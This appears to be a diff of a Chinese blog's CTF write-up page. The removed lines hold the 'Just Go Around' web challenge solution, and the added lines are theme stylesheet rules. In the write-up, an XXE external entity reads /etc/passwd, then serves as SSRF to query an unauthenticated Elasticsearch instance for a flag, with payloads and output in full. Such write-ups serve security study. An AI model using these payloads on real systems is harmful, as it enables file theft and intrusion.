-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;a href="/post"&gt;Post&lt;/a&gt;--&gt;</span></span><br></pre></td></tr></table></figure>
-<p>发现一个用于发帖的页面<code>/post</code>。提交表单后抓包发现帖子数据以<code>xml</code>格式被POST到了<code>/accept</code>路径，然后被重定向到<code>/accept</code>页面显示帖子并提示发帖功能暂不可用</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/accept</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>184.72.87.9:8013</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>221</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://184.72.87.9:8013</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://184.72.87.9:8013/post</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">postXml</span>=%<span class="number">3</span>C%<span class="number">3</span>Fxml+version%<span class="number">3</span>D%<span class="number">221</span>.<span class="number">0</span>%<span class="number">22</span>+encoding%<span class="number">3</span>D%<span class="number">22</span>UTF-<span class="number">8</span>%<span class="number">22</span>+standalone%<span class="number">3</span>D%<span class="number">22</span>no%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">3</span>Cpost+author%<span class="number">3</span>D%<span class="number">22</span>CTF+Participant%<span class="number">22</span>+id%<span class="number">3</span>D%<span class="number">220</span>%<span class="number">22</span>+title%<span class="number">3</span>D%<span class="number">22</span>test-title%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>Cmessage%<span class="number">3</span>Etest-message%<span class="number">3</span>C%<span class="number">2</span>Fmessage%<span class="number">3</span>E%<span class="number">3</span>C%<span class="number">2</span>Fpost%<span class="number">3</span>E</span></span><br></pre></td></tr></table></figure>
-<p>进行url解码</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> standalone=<span class="string">"no"</span>?&gt;</span><span class="tag">&lt;<span class="name">post</span> <span class="attr">author</span>=<span class="string">"CTF+Participant"</span> <span class="attr">id</span>=<span class="string">"0"</span> <span class="attr">title</span>=<span class="string">"test-title"</span>&gt;</span><span class="tag">&lt;<span class="name">message</span>&gt;</span>test-message<span class="tag">&lt;/<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">post</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>尝试利用XXE注入将<code>/etc/passwd</code>放到帖子的内容里</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> standalone=<span class="string">"no"</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">post</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">passwd</span> <span class="keyword">SYSTEM</span> <span class="string">"/etc/passwd"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">post</span> <span class="attr">author</span>=<span class="string">"CTF Participant"</span> <span class="attr">id</span>=<span class="string">"0"</span> <span class="attr">title</span>=<span class="string">"test-title"</span>&gt;</span><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;passwd;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">post</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>进行url编码并塞进<code>postXml</code>参数然后发送</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%20standalone%3d%22no%22%3f%3e%0a%3c!DOCTYPE%20post%20%5b%20%3c!ENTITY%20passwd%20SYSTEM%20%22/etc/passwd%22%3e%20%5d%3e%0a%3cpost%20author%3d%22CTF%20Participant%22%20id%3d%220%22%20title%3d%22test-title%22%3e%3cmessage%3e%26passwd%3b%3c%2fmessage%3e%3c%2fpost%3e</span><br></pre></td></tr></table></figure>
-<p>成功拿下<code>/etc/passwd</code></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>Author<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>CTF Participant<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>test-title<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>root:x:0:0:root:/root:/bin/bash</span><br><span class="line">	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">	bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">	sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">	sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">	games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">	irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">	_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>如果塞入的xml语句无法被解析则parser的报错会被显示出来，暴露出此网站由java搭建</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 20; XML version &amp;quot;5.0&amp;quot; is not supported, only XML 1.0 is supported.</span><br><span class="line">	at java.xml/com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(DOMParser.java:262)</span><br><span class="line">	at java.xml/com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:342)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>利用XXE探索服务器目录，看起来网站使用了SpringBoot框架，找到数据库配置文件<code>/JustGoAround/src/main/resources/application.properties</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.url=http://${ELASTIC_HOST:db}:9200</span><br></pre></td></tr></table></figure>
-<p>用搜索引擎搜索<code>ELASTIC_HOST:db</code>，跳出ElasticSearch数据库的相关结果。利用XXE让服务器访问ES相关API，成功显示结果，确认存在ES未授权访问漏洞</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">post</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">passwd</span> <span class="keyword">SYSTEM</span> <span class="string">"http://db:9200/_nodes"</span>&gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure>
-<p>尝试查看数据库信息</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">post</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">passwd</span> <span class="keyword">SYSTEM</span> <span class="string">"http://db:9200/_search"</span>&gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure>
-<p>找到flag</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"took"</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">"timed_out"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span><span class="attr">"_shards"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"total"</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">"successful"</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">"skipped"</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">"failed"</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">}</span><span class="punctuation">,</span><span class="attr">"hits"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"total"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"value"</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">,</span><span class="attr">"relation"</span><span class="punctuation">:</span><span class="string">"eq"</span><span class="punctuation">}</span><span class="punctuation">,</span><span class="attr">"max_score"</span><span class="punctuation">:</span><span class="number">1.0</span><span class="punctuation">,</span><span class="attr">"hits"</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">{</span><span class="attr">"_index"</span><span class="punctuation">:</span><span class="string">"posts"</span><span class="punctuation">,</span><span class="attr">"_id"</span><span class="punctuation">:</span><span class="string">"1"</span><span class="punctuation">,</span><span class="attr">"_score"</span><span class="punctuation">:</span><span class="number">1.0</span><span class="punctuation">,</span><span class="attr">"_source"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"id"</span><span class="punctuation">:</span><span class="string">"1"</span><span class="punctuation">,</span><span class="attr">"author"</span><span class="punctuation">:</span><span class="string">"Admin"</span><span class="punctuation">,</span><span class="attr">"title"</span><span class="punctuation">:</span><span class="string">"Secret Post"</span><span class="punctuation">,</span><span class="attr">"message"</span><span class="punctuation">:</span><span class="string">"flag{tHISiSapRIVATEpOSTdONTlOOK}"</span><span class="punctuation">,</span><span class="attr">"isActive"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">}</span><span class="punctuation">}</span><span class="punctuation">,</span><span class="punctuation">{</span><span class="attr">"_index"</span><span class="punctuation">:</span><span class="string">"posts"</span><span class="punctuation">,</span><span class="attr">"_id"</span><span class="punctuation">:</span><span class="string">"2"</span><span class="punctuation">,</span><span class="attr">"_score"</span><span class="punctuation">:</span><span class="number">1.0</span><span class="punctuation">,</span><span class="attr">"_source"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"id"</span><span class="punctuation">:</span><span class="string">"2"</span><span class="punctuation">,</span><span class="attr">"author"</span><span class="punctuation">:</span><span class="string">"CTF Participant"</span><span class="punctuation">,</span><span class="attr">"title"</span><span class="punctuation">:</span><span class="string">"First Post"</span><span class="punctuation">,</span><span class="attr">"message"</span><span class="punctuation">:</span><span class="string">"Hey, this is my first post!"</span><span class="punctuation">,</span><span class="attr">"isActive"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">}</span><span class="punctuation">}</span><span class="punctuation">,</span><span class="punctuation">{</span><span class="attr">"_index"</span><span class="punctuation">:</span><span class="string">"posts"</span><span class="punctuation">,</span><span class="attr">"_id"</span><span class="punctuation">:</span><span class="string">"3"</span><span class="punctuation">,</span><span class="attr">"_score"</span><span class="punctuation">:</span><span class="number">1.0</span><span class="punctuation">,</span><span class="attr">"_source"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"id"</span><span class="punctuation">:</span><span class="string">"3"</span><span class="punctuation">,</span><span class="attr">"author"</span><span class="punctuation">:</span><span class="string">"Hackerman"</span><span class="punctuation">,</span><span class="attr">"title"</span><span class="punctuation">:</span><span class="string">"Idea"</span><span class="punctuation">,</span><span class="attr">"message"</span><span class="punctuation">:</span><span class="string">"I'm wondering if I can access deleted posts on this site... I haven't had any luck with the search form, but maybe there's another way to reach the DB?"</span><span class="punctuation">,</span><span class="attr">"isActive"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">}</span><span class="punctuation">}</span><span class="punctuation">,</span><span class="punctuation">{</span><span class="attr">"_index"</span><span class="punctuation">:</span><span class="string">"posts"</span><span class="punctuation">,</span><span class="attr">"_id"</span><span class="punctuation">:</span><span class="string">"4"</span><span class="punctuation">,</span><span class="attr">"_score"</span><span class="punctuation">:</span><span class="number">1.0</span><span class="punctuation">,</span><span class="attr">"_source"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"id"</span><span class="punctuation">:</span><span class="string">"4"</span><span class="punctuation">,</span><span class="attr">"author"</span><span class="punctuation">:</span><span class="string">"Funny Guy"</span><span class="punctuation">,</span><span class="attr">"title"</span><span class="punctuation">:</span><span class="string">"Joke"</span><span class="punctuation">,</span><span class="attr">"message"</span><span class="punctuation">:</span><span class="string">"TODO: Come up with a good joke so CTF Participants can have a good chuckle"</span><span class="punctuation">,</span><span class="attr">"isActive"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">}</span><span class="punctuation">}</span><span class="punctuation">,</span><span class="punctuation">{</span><span class="attr">"_index"</span><span class="punctuation">:</span><span class="string">"posts"</span><span class="punctuation">,</span><span class="attr">"_id"</span><span class="punctuation">:</span><span class="string">"5"</span><span class="punctuation">,</span><span class="attr">"_score"</span><span class="punctuation">:</span><span class="number">1.0</span><span class="punctuation">,</span><span class="attr">"_source"</span><span class="punctuation">:</span><span class="punctuation">{</span><span class="attr">"id"</span><span class="punctuation">:</span><span class="string">"5"</span><span class="punctuation">,</span><span class="attr">"author"</span><span class="punctuation">:</span><span class="string">"Admin"</span><span class="punctuation">,</span><span class="attr">"title"</span><span class="punctuation">:</span><span class="string">"Oops"</span><span class="punctuation">,</span><span class="attr">"message"</span><span class="punctuation">:</span><span class="string">"I can't believe I posted my secrets earlier :( Luckily I deleted that post before anyone saw... I hope it was really deleted though"</span><span class="punctuation">,</span><span class="attr">"isActive"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">}</span><span class="punctuation">}</span><span class="punctuation">]</span><span class="punctuation">}</span><span class="punctuation">}</span></span><br></pre></td></tr></table></figure>
-                </div>
-
-                
-
-                <div class="post-bottom-tags-and-share border-box">
-                    <div>
-                        
-                            <ul class="post-tags-box border-box">
-                                
-                                    <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/ctf/">ctf</a>
-                                    </li>
-                                
-                            </ul>
-                        
-                    </div>
-                    <div>
-                        
-                            <div class="post-share-container border-box">
-    <ul class="share-list-wrap border-box">
-        <li class="qq share-item border-box flex-center tooltip"
-            data-tooltip-content="分享到 QQ"
-        >
-            <i class="fa-brands fa-qq"></i>
-        </li>
-        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
-            data-tooltip-content="分享到微信"
-            data-tooltip-img-tip="微信扫一扫"
-            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
-        >
-            <i class="fa-brands fa-weixin"></i>
-        </li>
-        <li class="weibo share-item border-box flex-center tooltip"
-            data-tooltip-content="分享到微博"
-        >
-            <i class="fa-brands fa-weibo"></i>
-        </li>
-    </ul>
-</div>
-
-                        
-                    </div>
-                </div>
-
-                
-
-                
-                    <div class="article-nav">
-                        
-                            <div class="article-prev">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2023/11/23/system-crash-recovery-full-root-filesystem/"
-                                   title="升级软件不小心填满根文件系统导致系统崩溃的恢复"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                      <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                            <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">升级软件不小心填满根文件系统导致系统崩溃的恢复</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
-                        
-                            <div class="article-next">
-                                <a class="next"
-                                   rel="next"
-                                   href="/2023/11/10/tsg-ctf-2023-writeup/"
-                                   title="TSG CTF 2023 Writeup"
-                                >
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">TSG CTF 2023 Writeup</span>
-                                        <span class="post-nav-item">下一篇</span>
-                                    </span>
-                                            <span class="right arrow-icon flex-center">
-                                      <i class="fas fa-chevron-right"></i>
-                                    </span>
-                                </a>
-                            </div>
-                        
-                    </div>
-                
-
-                
-                    
-
-
-
-
-
-
-                
-            </div>
-        </div>
-
-        
-            <div class="pc-post-toc right-toc">
-                <div class="post-toc-wrap border-box">
-    <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#kidz-corner-Sandbox-25-pts"><span class="nav-number">1.</span> <span class="nav-text">[kidz-corner] Sandbox (25 pts)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto-Crypto-Slide-Quest-100-pts"><span class="nav-number">2.</span> <span class="nav-text">[crypto] Crypto Slide Quest (100 pts)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reversing-Orakl-Password-Checker-100-pts"><span class="nav-number">3.</span> <span class="nav-text">[reversing] Orakl Password Checker (100 pts)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-Be-The-Admin-75-pts"><span class="nav-number">4.</span> <span class="nav-text">[web] Be The Admin (75 pts)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Just-Go-Around-250-pts"><span class="nav-number">5.</span> <span class="nav-text">[Web] Just Go Around (250 pts)</span></a></li></ol>
-    </div>
-</div>
-
-            </div>
-        
-    </div>
-</div>
-
-
-                
-            </div>
-
-        </div>
-
-        <div class="page-main-content-bottom border-box">
-            
-<footer class="footer border-box">
-    <div class="border-box website-info-box default">
-        
-            <div class="copyright-info info-item default">
-                &copy;&nbsp;<span>2023</span>&nbsp;-&nbsp;2023
-                
-                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">0x88dfac8bedc5</a>
-                
-            </div>
-
-            <!-- <div class="theme-info info-item default">
-                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
-            </div> -->
-
-            
-
-            
-        
-
-        <div class="count-item info-item default">
-            
-
-            
-
-            
-        </div>
-    </div>
-</footer>
-
-        </div>
-    </div>
-
-    <!-- post tools -->
-    
-        <div class="post-tools right-toc">
-            <div class="post-tools-container border-box">
-    <ul class="tools-list border-box">
-        <!-- PC TOC show toggle -->
-        
-            <li class="tools-item flex-center toggle-show-toc">
-                <i class="fas fa-list"></i>
-            </li>
-        
-
-        <!-- PC go comment -->
-        
-    </ul>
-</div>
-
-        </div>
-    
-
-    <!-- side tools -->
-    <div class="side-tools">
-        <div class="side-tools-container border-box ">
-    <ul class="side-tools-list side-tools-show-handle border-box">
-        <li class="tools-item tool-font-adjust-plus flex-center">
-            <i class="fas fa-search-plus"></i>
-        </li>
-
-        <li class="tools-item tool-font-adjust-minus flex-center">
-            <i class="fas fa-search-minus"></i>
-        </li>
-
-        <li class="tools-item tool-dark-light-toggle flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-            <li class="tools-item rss flex-center">
-                <a class="flex-center"
-                   href="/atom.xml"
-                   target="_blank"
-                >
-                    <i class="fas fa-rss"></i>
-                </a>
-            </li>
-        
-
-        <li class="tools-item tool-scroll-to-bottom flex-center">
-            <i class="fas fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="exposed-tools-list border-box">
-        
-            <li class="tools-item toggle-show-toc-tablet flex-center">
-                <i class="fas fa-list"></i>
-            </li>
-        
-
-        
-
-        <li class="tools-item tool-toggle-show flex-center">
-            <i class="fas fa-cog fa-spin"></i>
-        </li>
-
-        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
-            <i class="arrow fas fa-arrow-up"></i>
-            <span class="percent"></span>
-        </li>
-    </ul>
-</div>
-
-    </div>
-
-    <!-- image mask -->
-    <div class="zoom-in-image-mask">
-    <img class="zoom-in-image">
-</div>
-
-
-    <!-- local search -->
-    
-        <div class="search-pop-overlay">
-    <div class="popup search-popup">
-        <div class="search-header">
-          <span class="search-input-field-pre">
-            <i class="fas fa-keyboard"></i>
-          </span>
-            <div class="search-input-container">
-                <input autocomplete="off"
-                       autocorrect="off"
-                       autocapitalize="off"
-                       placeholder="搜索..."
-                       spellcheck="false"
-                       type="search"
-                       class="search-input"
-                >
-            </div>
-            <span class="close-popup-btn">
-                <i class="fas fa-times"></i>
-            </span>
-        </div>
-        <div id="search-result">
-            <div id="no-result">
-                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
-            </div>
-        </div>
-    </div>
-</div>
-
-    
-
-    <!-- tablet toc -->
-    
-        <div class="tablet-post-toc-mask">
-            <div class="tablet-post-toc">
-                <div class="post-toc-wrap border-box">
-    <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#kidz-corner-Sandbox-25-pts"><span class="nav-number">1.</span> <span class="nav-text">[kidz-corner] Sandbox (25 pts)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto-Crypto-Slide-Quest-100-pts"><span class="nav-number">2.</span> <span class="nav-text">[crypto] Crypto Slide Quest (100 pts)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reversing-Orakl-Password-Checker-100-pts"><span class="nav-number">3.</span> <span class="nav-text">[reversing] Orakl Password Checker (100 pts)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-Be-The-Admin-75-pts"><span class="nav-number">4.</span> <span class="nav-text">[web] Be The Admin (75 pts)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Just-Go-Around-250-pts"><span class="nav-number">5.</span> <span class="nav-text">[Web] Just Go Around (250 pts)</span></a></li></ol>
-    </div>
-</div>
-
-            </div>
-        </div>
-    
-</main>
-
-
+.page-container {
+  width: 100%;
+  height: auto;
+  background: var(--background-color-1);
+}
+.page-container .page-main-content {
+  display: flex;
+  flex-direction: column;
+  justify-content: space-between;
+  min-height: 100vh;
+  padding-top: var(--header-height);
+keep-tablet()
+keep-mobile()
+}
+.page-container .page-main-content.is-home .transparent-1 {
+  background: var(--header-transparent-background-1);
+  backdrop-filter: blur(var(--header-backdrop-filter-blur));
+}
+.page-container .page-main-content.is-home .transparent-2 {
+  background: var(--header-transparent-background-2);
+  backdrop-filter: blur(calc(var(--header-backdrop-filter-blur) * 1.25));
+}
+.header-shrink .page-container .page-main-content {
+  padding-top: var(--header-shrink-height);
+keep-tablet()
+keep-mobile()
+}
+.page-container .page-main-content .page-main-content-top {
+  position: fixed;
+  top: 0;
+  right: 0;
+  z-index: $z-index-5;
+  box-sizing: border-box;
+  width: 100%;
+  height: var(--header-height);
+keep-tablet()
+keep-mobile()
+}
+.page-container .page-main-content .page-main-content-top.hide {
+  transform: translateY(-105%);
+}
+.header-shrink .page-container .page-main-content .page-main-content-top {
+  height: var(--header-shrink-height);
+keep-tablet()
+keep-mobile()
+}
+.page-container .page-main-content .page-main-content-middle {
+  display: flex;
+  justify-content: center;
+  width: 100%;
+  padding: var(--components-spacing) 0;
+keep-tablet()
+keep-mobile()
+}
+.page-container .page-main-content .page-main-content-middle .main-content {
+  width: var(--page-content-width);
+  max-width: var(--page-content-max-width);
+  height: 100%;
+keep-tablet()
+keep-mobile()
+}
+.has-toc .page-container .page-main-content .page-main-content-middle .main-content {
+  max-width: var(--page-content-max-width-2);
+}
+.page-container .page-main-content .page-main-content-bottom {
+  width: 100%;
+}
+.page-container .post-tools {
+  position: fixed;
+  top: calc(var(--header-height) + var(--components-spacing));
+  box-sizing: border-box;
+  opacity: 0;
+keep-tablet()
+}
+.page-container .post-tools.right-toc {
+  left: calc((100vw - var(--page-content-max-width) / 2) - 5rem);
+}
+.page-container .post-tools.left-toc {
+  right: calc((100vw - var(--page-content-max-width) / 2) - 5rem);
+}
+.header-shrink .page-container .post-tools {
+  top: calc(var(--header-shrink-height) + var(--components-spacing));
+}
+.page-container .side-tools {
+  position: fixed;
+  right: 0;
+  bottom: 1.6rem;
+  box-sizing: border-box;
+  padding-right: 1rem;
+keep-tablet()
+}
+.page-container .side-tools:hover .side-tools-container {
+  transform: translateX(0);
+  opacity: 1;
+}
+.page-container .tablet-post-toc-mask {
+  position: fixed;
+  top: 0;
+  right: 0;
+  z-index: $z-index-10;
+  box-sizing: border-box;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0);
+  visibility: hidden;
+}
+.page-container .tablet-post-toc-mask .tablet-post-toc {
+  position: absolute;
+  top: 0;
+  left: 0;
+  box-sizing: border-box;
+  width: 22rem;
+  height: 100%;
+  padding: 1.2rem 1rem;
+  background: var(--background-color-1);
+  transform: translateX(-100%);
+keep-mobile()
+}
 
 <!-- common -->
 <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.8.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.8.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.8.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.8.5/source/js/dark-light-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.8.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.8.5/source/js/libs/anime.min.js"></script>
